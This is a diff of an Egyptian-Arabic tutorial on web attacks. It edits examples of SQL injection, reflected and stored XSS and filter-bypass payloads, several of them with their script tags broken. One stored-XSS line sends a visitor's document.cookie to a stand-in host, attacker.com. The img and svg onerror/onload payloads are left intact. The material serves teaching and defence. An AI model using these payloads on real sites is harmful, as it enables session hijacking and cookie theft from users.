@@ -109,7 +109,8 @@ http://example.com/login.php?user=admin' OR '1'='1' -- &pass=12345
 إنك تحط كود JavaScript ضار في التطبيق. مثال:
 
 html
-<script>alert('XSS Attack');</script>
+
+script>alert('XSS Attack');</script>
 
 لو ظهرت الرسالة، التطبيق معرض لهجوم XSS.
 
@@ -310,7 +311,7 @@ Reflected XSS بالتفصيل
 مثال عملي:
 
 text
-http://example.com/search?query=<script>alert(document.cookie)</script>
+http://example.com/search?query= script>alert(document.cookie)</script>
 
 لو ظهر Alert فيه قيمة الكوكيز، يبقى فيه ثغرة Reflected XSS فعلية، وده معناه إن المهاجم يقدر يسرق جلسة المستخدم لو خدعه يدوس على رابط مشابه.
 
@@ -319,7 +320,7 @@ Stored XSS بالتفصيل
 مثال عملي: لو فيه صفحة تعليقات في مدونة، وحطيت في خانة التعليق:
 
 html
-<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
+<script fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
 
 ولو الموقع خزّن التعليق ده وعرضه لكل الزوار من غير تنقية، كل زائر يفتح الصفحة كوكيز جلسته هتتبعت تلقائيًا للمهاجم.
 
@@ -741,7 +742,7 @@ WAF هي أنظمة تُستخدم لحماية تطبيقات الويب من �
 لو الفلتر بيرفض <script> بالظبط، ممكن تجرب:
 
 html
-<ScRiPt>alert(1)</ScRiPt>
+ ScRiPt>alert(1)</ScRiPt>
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
 
